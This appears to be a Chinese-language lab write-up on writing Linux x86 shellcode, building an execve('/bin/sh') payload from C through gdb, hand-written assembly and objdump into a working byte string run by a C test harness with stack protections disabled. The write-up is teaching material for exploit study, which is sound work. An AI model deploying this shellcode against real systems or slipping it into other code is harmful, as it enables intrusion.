# <center>shellcode编写实验</center>

## 实验概述

### 【目的】
编写Linux环境下的shellcode。
### 【环境】
Linux
### 【工具】
gdb
### 【原理】
shellcode是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。
shellcode基本的编写方式：
- 编写c程序实现功能
- 使用汇编来替代函数调用等
- 汇编编译链接，获取机器码
## 实验步骤

### 【步骤】
这里使用c语言来进行编写。
```
#include<stdio.h>
int main()
{
    char *name[2];
    name[0]="/bin/sh";
    name[1]=NULL;
    execve(name[0],name,NULL);
}
```
其中execve进行系统调用，通过name[0]提供的参数"/bin/sh"起一个shell。
execve（参数1，参数2，参数3）
参数1：命令所在路径
参数2：命令的集合
参数3：传递给执行文件的环境变量集
 
尝试编译运行。
```
$ gcc shell.c -o shell
$ ./shell
$ echo u got it
u got it
```
用gdb查看
```
$ gdb shell -q
pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from shell...(no debugging symbols found)...done.
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400596 <+0>:	push   rbp
   0x0000000000400597 <+1>:	mov    rbp,rsp
   0x000000000040059a <+4>:	sub    rsp,0x20
   0x000000000040059e <+8>:	mov    rax,QWORD PTR fs:0x28
   0x00000000004005a7 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004005ab <+21>:	xor    eax,eax
   0x00000000004005ad <+23>:	mov    QWORD PTR [rbp-0x20],0x400674
   0x00000000004005b5 <+31>:	mov    QWORD PTR [rbp-0x18],0x0
   0x00000000004005bd <+39>:	mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004005c1 <+43>:	lea    rcx,[rbp-0x20]
   0x00000000004005c5 <+47>:	mov    edx,0x0
   0x00000000004005ca <+52>:	mov    rsi,rcx
   0x00000000004005cd <+55>:	mov    rdi,rax
   0x00000000004005d0 <+58>:	call   0x400480 <execve@plt>
   0x00000000004005d5 <+63>:	mov    eax,0x0
   0x00000000004005da <+68>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004005de <+72>:	xor    rdx,QWORD PTR fs:0x28
   0x00000000004005e7 <+81>:	je     0x4005ee <main+88>
   0x00000000004005e9 <+83>:	call   0x400460 <__stack_chk_fail@plt>
   0x00000000004005ee <+88>:	leave  
   0x00000000004005ef <+89>:	ret    
End of assembler dump.
pwndbg> 
```
其中关键点在
```
0x00000000004005c5 <+47>:	mov    edx,0x0
0x00000000004005ca <+52>:	mov    rsi,rcx
0x00000000004005cd <+55>:	mov    rdi,rax
0x00000000004005d0 <+58>:	call   0x400480 <execve@plt>
```
传递了三个参数并且call execve()。
直接使用这四条指令显然是不行的，shellcode需要能够独立运行并且尽量短小，这里的`call   0x400480 <execve@plt>`依赖plt表，前面的参数传递也依赖程序的数据段等，我们需要用汇编来重写这里的代码。
对于`call   0x400480 <execve@plt>`，我们可以用系统调用来重写，execve的调用号为：0xb，那么就有
```
mov al,0xb
int 0x80
```
这里的0x80是根据al的值进行系统调用。
为了传参方便，这里采用32位汇编的写法，把参数push到栈上就可以传递参数了。
先将"/bin/sh"压栈
```
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
```
注意这里用xor eax,eax把eax置0，不使用`mov eax,0`的原因是这样会出现`\x00`，shellcode会被gets()这类函数截断。
esp指向当前栈顶，此时即指向"/bin/sh",我们把esp保存到ebx
```
mov ebx,esp    
```
现在把两个参数压栈，eax为NULL(0)，ebx为"/bin/sh"的地址
```
push eax
push ebx
```
此时esp指向数组argv，把它赋值给ecx。
```
mov ecx,esp
xor edx,edx
mov al,0xb  
int 0x80       ;通过中断0x80进行系统调用
```
所以有完整的代码：
```
section .text
global _start
 
_start:
xor eax,eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx,esp
xor edx,edx
mov al,0xb
int 0x80
```
使用nasm编译，链接，运行
```
$ ld -o shell shell.o
$ ld -m elf_i386 -o shell shell.o
$ ./shell
$ echo u got it
u got it
```
成功了，使用objdump提取
```
$ objdump -d shell

shell:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 2f 2f 73 68       	push   $0x68732f2f
 8048068:	68 2f 62 69 6e       	push   $0x6e69622f
 804806d:	89 e3                	mov    %esp,%ebx
 804806f:	50                   	push   %eax
 8048070:	53                   	push   %ebx
 8048071:	89 e1                	mov    %esp,%ecx
 8048073:	31 d2                	xor    %edx,%edx
 8048075:	b0 0b                	mov    $0xb,%al
 8048077:	cd 80                	int    $0x80

```
这样就提取到了,下面可以写个c程序验证一下。
```
#include <stdio.h>
 
char shellcode[]="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";
 
int main()
{
    void (*fp) (void);
    fp=(void *)shellcode;
    fp();
}
```
```
$ gcc auth.c -fno-stack-protector -o auth -z execstack -m32
$ ./auht
$ echo u got it
u got it

```
### 【总结】

本次实验主要练习了linux下shellcode的编写。